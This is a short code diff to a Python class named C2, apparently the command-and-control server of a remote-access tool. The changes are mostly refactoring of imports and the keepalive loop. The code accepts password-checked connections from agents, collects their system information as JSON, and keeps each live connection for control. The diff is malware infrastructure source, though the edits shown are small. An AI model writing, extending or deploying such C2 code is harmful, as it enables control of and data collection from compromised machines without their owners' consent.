@@ -1,10 +1,8 @@
-import socket
 import sys, os, time
-import json
+import socket, json
 from lib.helper import *
 from lib.debug import Debug
 from lib.dmos import Dmos
-from hashlib import md5
 
 class C2():
     def __init__(self, ANODE, APORT, multi_handler):
@@ -38,17 +36,16 @@ class C2():
         conn, address = self.s.accept()
         if conn.recv(36).decode() == self.PASS:
             intel = conn.recv(1024).decode()
-
             intel = json.loads(intel)
-                #print(intel)
+        
             return Dmos(intel["basic"], intel["sysinfo"], address[0], conn, self)
 
     @safe_exec
     def keepAlive(self):
         while 1:
             time.sleep(self.keepAliveSleepInterval)
-            for d, hash in enumerate(self.multi_handler.dmoss.copy()):
+            for _, hash in enumerate(self.multi_handler.dmoss.copy()):
                 try:
                     self.multi_handler.dmoss[hash].conn.send(b" ")
                 except:
-                    terminate(self.multi_handler.dmoss, self, signal="error")
+                    terminate(self.multi_handler.dmoss, self.multi_handler.dmoss[hash], signal="error")
